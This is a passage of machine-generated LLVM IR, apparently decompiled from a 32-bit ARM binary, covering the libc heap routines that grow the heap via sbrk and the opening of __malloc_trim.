  store i32 %v4_172f0, i32* @r7, align 4
  %v1_172f4 = add i32 %v4_172f0, 864
  %v2_172f4 = inttoptr i32 %v1_172f4 to i32*
  %v3_172f4 = load i32, i32* %v2_172f4, align 4
  store i32 %v3_172f4, i32* %r3.global-to-local, align 4
  %v1_172f8 = urem i32 %v3_172f4, 2
  store i32 %v1_172f8, i32* @r6, align 4
  %v2_172f8 = icmp eq i32 %v1_172f8, 0
  br i1 %v2_172f8, label %dec_label_pc_1738c, label %dec_label_pc_17300

dec_label_pc_17300:                               ; preds = %.thread40
  %v0_17300 = load i32, i32* @r8, align 4
  %v2_17300 = icmp eq i32 %v0_17300, 0
  br i1 %v2_17300, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_17300
  %v2_17304 = add i32 %v4_172f0, 872
  %v3_17304 = inttoptr i32 %v2_17304 to i32*
  %v4_17304 = load i32, i32* %v3_17304, align 4
  store i32 %v4_17304, i32* %r2.global-to-local, align 4
  %v1_17308 = load i32, i32* %r1.global-to-local, align 4
  %v2_17308 = load i32, i32* @r4, align 4
  %v3_17308 = sub i32 %v2_17308, %v1_17308
  %v3_1730c = add i32 %v3_17308, %v4_17304
  store i32 %v3_1730c, i32* %r3.global-to-local, align 4
  store i32 %v3_1730c, i32* %v3_17304, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_17300, %bb161
  %v0_17314 = load i32, i32* @r4, align 4
  %v1_17314 = urem i32 %v0_17314, 8
  store i32 %v1_17314, i32* %r3.global-to-local, align 4
  %v2_17314 = icmp eq i32 %v1_17314, 0
  br i1 %v2_17314, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_17318 = sub nsw i32 8, %v1_17314
  store i32 %v2_17318, i32* %r3.global-to-local, align 4
  %v3_1731c = add i32 %v2_17318, %v0_17314
  store i32 %v3_1731c, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_17324 = phi i32 [ 0, %.thread43 ], [ %v2_17318, %bb162 ]
  %v1_17320 = load i32, i32* @r5, align 4
  %v2_17320 = add i32 %v1_17320, %v0_17314
  store i32 %v2_17320, i32* @r6, align 4
  %v1_17324 = load i32, i32* @r8, align 4
  %v2_17324 = add i32 %v2_17320, %v0_17324
  %v2_17328 = add i32 %v2_17324, %v1_17324
  store i32 %v2_17328, i32* %r1.global-to-local, align 4
  %v1_1732c = load i32, i32* %sb.global-to-local, align 4
  %v2_1732c = add i32 %v1_1732c, %v2_17328
  %v1_17330 = load i32, i32* %fp.global-to-local, align 4
  %v2_17330 = and i32 %v1_17330, %v2_1732c
  store i32 %v2_17330, i32* %r2.global-to-local, align 4
  %v2_17334 = sub i32 0, %v2_17320
  store i32 %v2_17334, i32* %r3.global-to-local, align 4
  %v2_17338 = sub i32 %v2_17330, %v2_17320
  store i32 %v2_17338, i32* @r5, align 4
  store i32 %v2_17338, i32* %r0.global-to-local, align 4
  br i1 %v2_17314, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_17314, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_17344 = call i32 @__GI_sbrk(i32 %v2_17338)
  store i32 %v1_17344, i32* %r0.global-to-local, align 4
  %v3_17348 = icmp eq i32 %v1_17344, -1
  br i1 %v3_17348, label %dec_label_pc_17350, label %dec_label_pc_17360

dec_label_pc_17350:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_17354 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_17354, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_173b8

dec_label_pc_17360:                               ; preds = %bb164
  %v1_17360 = load i32, i32* @r4, align 4
  %v3_17360 = icmp ult i32 %v1_17344, %v1_17360
  br i1 %v3_17360, label %dec_label_pc_17368, label %dec_label_pc_173b8

dec_label_pc_17368:                               ; preds = %dec_label_pc_17360
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r0.global-to-local, align 4
  %v4_17370 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_17370, i32* %r2.global-to-local, align 4
  %v1_17374 = add i32 %v4_17370, 864
  %v2_17374 = inttoptr i32 %v1_17374 to i32*
  %v3_17374 = load i32, i32* %v2_17374, align 4
  %v0_17378 = load i32, i32* @r6, align 4
  store i32 %v0_17378, i32* %r0.global-to-local, align 4
  %v1_1737c = and i32 %v3_17374, -2
  store i32 %v1_1737c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_1737c, i32* %v2_17374, align 4
  br label %dec_label_pc_173b8

dec_label_pc_1738c:                               ; preds = %.thread40
  %v0_1738c = load i32, i32* %r0.global-to-local, align 4
  %v3_1738c = icmp eq i32 %v0_1738c, -1
  br i1 %v3_1738c, label %dec_label_pc_17394, label %dec_label_pc_173b0

dec_label_pc_17394:                               ; preds = %dec_label_pc_1738c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_17398 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_17398, i32* %r0.global-to-local, align 4
  %v0_1739c = load i32, i32* @r7, align 4
  %v1_1739c = add i32 %v0_1739c, 872
  %v2_1739c = inttoptr i32 %v1_1739c to i32*
  %v3_1739c = load i32, i32* %v2_1739c, align 4
  store i32 %v3_1739c, i32* %r2.global-to-local, align 4
  %v0_173a0 = load i32, i32* @r4, align 4
  %v0_173a4 = load i32, i32* @r5, align 4
  %v2_173a0 = add i32 %v3_1739c, %v1_17398
  %v2_173a4 = sub i32 %v2_173a0, %v0_173a0
  %v2_173a8 = sub i32 %v2_173a4, %v0_173a4
  store i32 %v2_173a8, i32* %r3.global-to-local, align 4
  store i32 %v2_173a8, i32* %v2_1739c, align 4
  %v0_173b4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_173b0

dec_label_pc_173b0:                               ; preds = %dec_label_pc_1738c, %dec_label_pc_17394
  %v0_173b4 = phi i32 [ 0, %dec_label_pc_1738c ], [ %v0_173b4.pre, %dec_label_pc_17394 ]
  %v0_173b0 = load i32, i32* @r4, align 4
  store i32 %v0_173b0, i32* @r7, align 4
  store i32 %v0_173b4, i32* @r5, align 4
  br label %dec_label_pc_173b8

dec_label_pc_173b8:                               ; preds = %dec_label_pc_17360, %dec_label_pc_17368, %dec_label_pc_17350, %dec_label_pc_173b0
  %v0_173b8 = load i32, i32* %r0.global-to-local, align 4
  %v7_173b8 = icmp eq i32 %v0_173b8, -1
  br i1 %v7_173b8, label %dec_label_pc_1743c, label %dec_label_pc_173c0

dec_label_pc_173c0:                               ; preds = %dec_label_pc_173b8
  %v1_173c0 = load i32, i32* @r5, align 4
  %v2_173c0 = add i32 %v1_173c0, %v0_173b8
  %v0_173c4 = load i32, i32* @r7, align 4
  %v2_173c4 = sub i32 %v2_173c0, %v0_173c4
  %v1_173c8 = or i32 %v2_173c4, 1
  %v2_173cc = add i32 %v0_173c4, 4
  %v3_173cc = inttoptr i32 %v2_173cc to i32*
  store i32 %v1_173c8, i32* %v3_173cc, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r1.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_173d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_173d8, i32* @r6, align 4
  %v1_173dc = add i32 %v4_173d8, 872
  %v2_173dc = inttoptr i32 %v1_173dc to i32*
  %v3_173dc = load i32, i32* %v2_173dc, align 4
  %v0_173e0 = load i32, i32* @r8, align 4
  %v2_173e0 = icmp eq i32 %v0_173e0, 0
  %v0_173e4 = load i32, i32* @r5, align 4
  %v2_173e4 = add i32 %v0_173e4, %v3_173dc
  store i32 %v2_173e4, i32* %r3.global-to-local, align 4
  store i32 %v2_173e4, i32* %v2_173dc, align 4
  %v0_173ec = load i32, i32* @r7, align 4
  %v1_173ec = load i32, i32* @r6, align 4
  %v2_173ec = add i32 %v1_173ec, 44
  %v3_173ec = inttoptr i32 %v2_173ec to i32*
  store i32 %v0_173ec, i32* %v3_173ec, align 4
  br i1 %v2_173e0, label %dec_label_pc_1743c, label %dec_label_pc_173f4

dec_label_pc_173f4:                               ; preds = %dec_label_pc_173c0
  %v0_173f8 = load i32, i32* @r8, align 4
  %v1_173f8 = add i32 %v0_173f8, -12
  %v1_173fc = and i32 %v1_173f8, -8
  store i32 %v3_171c4, i32* %ip.global-to-local, align 4
  %v2_17404 = add i32 %v1_173fc, %v3_171c4
  store i32 %v2_17404, i32* %r1.global-to-local, align 4
  %v2_17408 = icmp ugt i32 %v1_173fc, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_17410 = or i32 %v1_173fc, 1
  store i32 %v1_17410, i32* %r3.global-to-local, align 4
  store i32 %v1_17410, i32* %v2_171d0, align 4
  %v0_17418 = load i32, i32* %r2.global-to-local, align 4
  %v1_17418 = load i32, i32* %r1.global-to-local, align 4
  %v2_17418 = add i32 %v1_17418, 8
  %v3_17418 = inttoptr i32 %v2_17418 to i32*
  store i32 %v0_17418, i32* %v3_17418, align 4
  %v0_1741c = load i32, i32* %r2.global-to-local, align 4
  %v1_1741c = load i32, i32* %r1.global-to-local, align 4
  %v2_1741c = add i32 %v1_1741c, 4
  %v3_1741c = inttoptr i32 %v2_1741c to i32*
  store i32 %v0_1741c, i32* %v3_1741c, align 4
  br i1 %v2_17408, label %dec_label_pc_17424, label %dec_label_pc_1743c

dec_label_pc_17424:                               ; preds = %dec_label_pc_173f4
  %v0_17424 = load i32, i32* @r6, align 4
  %v1_17424 = add i32 %v0_17424, 836
  %v2_17424 = inttoptr i32 %v1_17424 to i32*
  %v3_17424 = load i32, i32* %v2_17424, align 4
  store i32 %v3_17424, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1742c = load i32, i32* %ip.global-to-local, align 4
  %v1_1742c = add i32 %v0_1742c, 8
  store i32 %v1_1742c, i32* @r0, align 4
  store i32 -1, i32* %v2_17424, align 4
  %v0_17434 = call i32 @free()
  store i32 %v0_17434, i32* %r0.global-to-local, align 4
  %v0_17438 = load i32, i32* @r4, align 4
  %v1_17438 = load i32, i32* @r6, align 4
  %v2_17438 = add i32 %v1_17438, 836
  %v3_17438 = inttoptr i32 %v2_17438 to i32*
  store i32 %v0_17438, i32* %v3_17438, align 4
  br label %dec_label_pc_1743c

dec_label_pc_1743c:                               ; preds = %.thread34, %dec_label_pc_173f4, %dec_label_pc_173c0, %dec_label_pc_173b8, %dec_label_pc_17424
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r0.global-to-local, align 4
  %v4_17444 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_17444, i32* %lr.global-to-local, align 4
  %v1_17448 = add i32 %v4_17444, 872
  store i32 %v1_17448, i32* %r1.global-to-local, align 4
  %v1_1744c = inttoptr i32 %v1_17448 to i32*
  %v2_1744c = load i32, i32* %v1_1744c, align 4
  store i32 %v2_1744c, i32* %r1.global-to-local, align 4
  %v3_1744c = add i32 %v4_17444, 876
  %v4_1744c = inttoptr i32 %v3_1744c to i32*
  %v5_1744c = load i32, i32* %v4_1744c, align 4
  store i32 %v5_1744c, i32* %r3.global-to-local, align 4
  %v1_17454 = add i32 %v4_17444, 868
  %v2_17454 = inttoptr i32 %v1_17454 to i32*
  %v3_17454 = load i32, i32* %v2_17454, align 4
  store i32 %v3_17454, i32* %r3.global-to-local, align 4
  %v1_17458 = add i32 %v4_17444, 884
  %v2_17458 = inttoptr i32 %v1_17458 to i32*
  %v3_17458 = load i32, i32* %v2_17458, align 4
  store i32 %v3_17458, i32* %r2.global-to-local, align 4
  %v2_1745c = add i32 %v3_17454, %v2_1744c
  store i32 %v2_1745c, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_1744c, %v5_1744c
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_1743c
  store i32 %v2_1744c, i32* %v4_1744c, align 4
  %v0_17464.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_17464.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_1743c, %bb165
  %v1_17464 = phi i32 [ %v3_17458, %dec_label_pc_1743c ], [ %v1_17464.pre, %bb165 ]
  %v4_17468 = phi i32 [ %v2_1745c, %dec_label_pc_1743c ], [ %v0_17464.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_17468, %v1_17464
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_17468 = load i32, i32* %lr.global-to-local, align 4
  %v6_17468 = add i32 %v5_17468, 884
  %v7_17468 = inttoptr i32 %v6_17468 to i32*
  store i32 %v4_17468, i32* %v7_17468, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_1746c = load i32, i32* %lr.global-to-local, align 4
  %v1_1746c = add i32 %v0_1746c, 44
  %v2_1746c = inttoptr i32 %v1_1746c to i32*
  %v3_1746c = load i32, i32* %v2_1746c, align 4
  store i32 %v3_1746c, i32* %ip.global-to-local, align 4
  %v1_17470 = add i32 %v3_1746c, 4
  %v2_17470 = inttoptr i32 %v1_17470 to i32*
  %v3_17470 = load i32, i32* %v2_17470, align 4
  store i32 %v1_17084, i32* %r1.global-to-local, align 4
  %v1_17478 = and i32 %v3_17470, -4
  store i32 %v1_17478, i32* %r3.global-to-local, align 4
  %v3_1747c = icmp ult i32 %v1_17478, %v1_17084
  br i1 %v3_1747c, label %dec_label_pc_174a8, label %dec_label_pc_17484

dec_label_pc_17484:                               ; preds = %bb168
  %v0_17484 = load i32, i32* @sl, align 4
  %v2_17484 = sub i32 %v1_17478, %v0_17484
  %v2_17488 = add i32 %v0_17484, %v3_1746c
  store i32 %v2_17488, i32* %r1.global-to-local, align 4
  %v1_1748c = or i32 %v2_17484, 1
  store i32 %v1_1748c, i32* %r3.global-to-local, align 4
  %v1_17490 = or i32 %v0_17484, 1
  store i32 %v1_17490, i32* %r2.global-to-local, align 4
  %v1_17494 = add i32 %v3_1746c, 8
  store i32 %v1_17494, i32* %r0.global-to-local, align 4
  store i32 %v1_17490, i32* %v2_17470, align 4
  %v0_1749c = load i32, i32* %r1.global-to-local, align 4
  %v1_1749c = load i32, i32* %lr.global-to-local, align 4
  %v2_1749c = add i32 %v1_1749c, 44
  %v3_1749c = inttoptr i32 %v2_1749c to i32*
  store i32 %v0_1749c, i32* %v3_1749c, align 4
  %v0_174a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_174a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_174a0 = add i32 %v1_174a0, 4
  %v3_174a0 = inttoptr i32 %v2_174a0 to i32*
  store i32 %v0_174a0, i32* %v3_174a0, align 4
  br label %dec_label_pc_174c0

dec_label_pc_174a8:                               ; preds = %bb157, %bb168, %dec_label_pc_17284
  store i32 109520, i32* %r3.global-to-local, align 4
  %v0_174ac = call i32 @__aeabi_read_tp()
  %v3_174b0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_174b0 = sext i16 %v3_174b0 to i32
  store i32 %v4_174b0, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_174b8 = add i32 %v4_174b0, %v0_174ac
  %v4_174b8 = inttoptr i32 %v3_174b8 to i32*
  store i32 12, i32* %v4_174b8, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174c0

dec_label_pc_174c0:                               ; preds = %bb151, %bb150, %dec_label_pc_17484, %dec_label_pc_170cc, %dec_label_pc_174a8
  %v0_174c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_174c0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_174c4

dec_label_pc_174c4:                               ; preds = %.thread1, %dec_label_pc_17098, %.thread121, %dec_label_pc_16f08, %dec_label_pc_16efc, %dec_label_pc_16d64, %dec_label_pc_16ce8, %dec_label_pc_174c0
  store i32 %v2_16c08, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 52, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r2, align 4
  %v4_174d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 52) to i32*), align 4
  store i32 %v4_174d4, i32* @ip, align 4
  store i32 95456, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_174d4)
  br label %dec_label_pc_174e0

dec_label_pc_174e0:                               ; preds = %dec_label_pc_16c40, %dec_label_pc_174c4
  %v0_174e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_174e0, i32* %r0.global-to-local, align 4
  store i32 %v3_16bdc, i32* @r4, align 4
  store i32 %v6_16bdc, i32* @r5, align 4
  store i32 %v9_16bdc, i32* @r6, align 4
  store i32 %v12_16bdc, i32* @r7, align 4
  store i32 %v15_16bdc, i32* @r8, align 4
  store i32 %v18_16bdc, i32* @sb, align 4
  store i32 %v21_16bdc, i32* @sl, align 4
  store i32 %v24_16bdc, i32* @fp, align 4
  store i32 %v27_16bdc, i32* @lr, align 4
  ret i32 %v0_174e0

; uselistorder directives
  uselistorder i32 %v0_17484, { 1, 0, 2 }
  uselistorder i32 %v3_1746c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17468, { 1, 0 }
  uselistorder i32 %v2_1744c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_17444, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_173fc, { 1, 2, 0 }
  uselistorder i32 %v0_173c4, { 1, 0 }
  uselistorder i32 %v0_173b8, { 1, 0 }
  uselistorder i32 %v2_173a8, { 1, 0 }
  uselistorder i32 %v2_17338, { 2, 1, 0 }
  uselistorder i32 %v2_17320, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17318, { 1, 0, 2 }
  uselistorder i32 %v1_17314, { 2, 1, 0 }
  uselistorder i32 %v0_17314, { 3, 1, 2, 0 }
  uselistorder i32 %v1_172f8, { 1, 0 }
  uselistorder i32 %v2_172d0, { 1, 0 }
  uselistorder i32 %v3_172c4, { 1, 0, 2 }
  uselistorder i32 %v2_172a4, { 1, 0, 2 }
  uselistorder i32* %v2_1729c, { 1, 0, 2 }
  uselistorder i32 %v0_17284, { 1, 0 }
  uselistorder i32 %v6_17260, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_1724c, { 2, 1, 0 }
  uselistorder i32 %v0_17234, { 1, 0 }
  uselistorder i32 %v2_171f0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_171ec, { 1, 0 }
  uselistorder i32 %v3_171c4, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_171a4, { 1, 0, 2 }
  uselistorder i32 %v2_1718c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_17134, { 2, 1, 0 }
  uselistorder i32 %v6_17128, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_17104, { 2, 1, 0, 3 }
  uselistorder i32 %v3_170c4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17084, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_1707c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17078, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_17064, { 1, 0 }
  uselistorder i32 %v7_17024, { 1, 0 }
  uselistorder i32 %v4_17024, { 1, 0 }
  uselistorder i32 %v0_16ff4, { 1, 0 }
  uselistorder i32 %v2_16fc8, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_16fc454, { 1, 0 }
  uselistorder i32 %v1_16f90, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_16f78., { 1, 2, 0 }
  uselistorder i32 %v0_16f80, { 0, 1, 3, 2 }
  uselistorder i32 %v1_16f80, { 1, 0 }
  uselistorder i32 %v3_16f60, { 1, 0 }
  uselistorder i32 %v4_16f5c, { 1, 0, 2 }
  uselistorder i32 %v1_16ecc, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16f24, { 1, 0 }
  uselistorder i32 %v1_16f08, { 1, 0 }
  uselistorder i32 %v1_16da8, { 1, 0 }
  uselistorder i32 %v0_16ee8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_16eb0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16f44.pre, { 1, 2, 0 }
  uselistorder i32 %v0_16e8c, { 2, 1, 0 }
  uselistorder i32 %v3_16e80, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_16da0, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_16e48, { 1, 0 }
  uselistorder i32 %v3_16e3c, { 1, 0 }
  uselistorder i32 %v0_16e48, { 1, 0 }
  uselistorder i32 %v3_16e20, { 0, 2, 3, 1 }
  uselistorder i32 %v2_16e10, { 1, 0, 2 }
  uselistorder i32 %v3_16dc8, { 2, 1, 0 }
  uselistorder i32 %v0_16db8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16d88, { 1, 0 }
  uselistorder i32 %v1_16d3c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_16d38, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_16cdc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_16cd0, { 1, 0 }
  uselistorder i32 %v3_16ca0, { 1, 0 }
  uselistorder i32 %v0_16c94, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_16c74, { 0, 2, 1, 3 }
  uselistorder i1 %v7_16c68, { 1, 0 }
  uselistorder i32 %v0_16c38, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 0, 1, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 2, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 36, 32, 33, 1, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 36, 35, 28, 25, 0, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_174e0, { 1, 0 }
  uselistorder label %dec_label_pc_174c4, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_174c0, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_174a8, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_1743c, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_173b8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_173b0, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_17284, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_171b8, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_17070, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_16fc4, { 1, 0 }
  uselistorder label %dec_label_pc_16fcc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_16f90, { 1, 0 }
  uselistorder label %dec_label_pc_16f44, { 1, 0 }
  uselistorder label %dec_label_pc_16ed8, { 1, 0 }
  uselistorder label %dec_label_pc_16ed4, { 1, 0 }
  uselistorder label %dec_label_pc_16e80, { 1, 0 }
  uselistorder label %dec_label_pc_16e6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16e34, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16e20, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_174f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_174f4:
  %v0_174f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_174f4, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_174f4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_174f4, %bb
  %v10_17510 = phi i32 [ %arg1, %dec_label_pc_174f4 ], [ 0, %bb ]
  ret i32 %v10_17510

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_17514 = add i32 %arg2, 44
  %v2_17514 = inttoptr i32 %v1_17514 to i32*
  %v3_17514 = load i32, i32* %v2_17514, align 4
  %v9_17518 = load i32, i32* @r6, align 4
  %v12_17518 = load i32, i32* @r7, align 4
  %v1_1751c = add i32 %v3_17514, 4
  %v2_1751c = inttoptr i32 %v1_1751c to i32*
  %v3_1751c = load i32, i32* %v2_1751c, align 4
  %v1_17520 = add i32 %arg2, 860
  %v2_17520 = inttoptr i32 %v1_17520 to i32*
  %v3_17520 = load i32, i32* %v2_17520, align 4
  store i32 %v3_17520, i32* @r4, align 4
  %v1_17524 = and i32 %v3_1751c, -4
  store i32 %v1_17524, i32* @r6, align 4
  %v1_17528 = add i32 %v1_17524, -17
  %v2_1752c = add i32 %v1_17528, %v3_17520
  store i32 %arg2, i32* @r5, align 4
  %v2_17538 = sub i32 %v2_1752c, %arg1
  store i32 %v3_17520, i32* %r1.global-to-local, align 4
  %v2_17540 = udiv i32 %v2_17538, %v3_17520
  %v1_17544 = add i32 %v2_17540, -1
  store i32 %v1_17544, i32* %r0.global-to-local, align 4
  %v2_17548 = mul i32 %v1_17544, %v3_17520
  store i32 %v2_17548, i32* @r7, align 4
  %v2_1754c = icmp eq i32 %v2_17548, 0
  store i1 %v2_1754c, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_17548, 1
  br i1 %tmp8, label %dec_label_pc_175b4, label %dec_label_pc_17554

dec_label_pc_17554:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_17558 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_17558, i32* %r0.global-to-local, align 4
  %v0_1755c = load i32, i32* @r5, align 4
  %v1_1755c = add i32 %v0_1755c, 44
  %v2_1755c = inttoptr i32 %v1_1755c to i32*
  %v3_1755c = load i32, i32* %v2_1755c, align 4
  %v0_17560 = load i32, i32* @r6, align 4
  %v2_17560 = add i32 %v0_17560, %v3_1755c
  %v9_17564 = icmp eq i32 %v1_17558, %v2_17560
  store i1 %v9_17564, i1* @cpsr_z, align 1
  store i32 %v1_17558, i32* @r4, align 4
  br i1 %v9_17564, label %dec_label_pc_17570, label %dec_label_pc_175b4

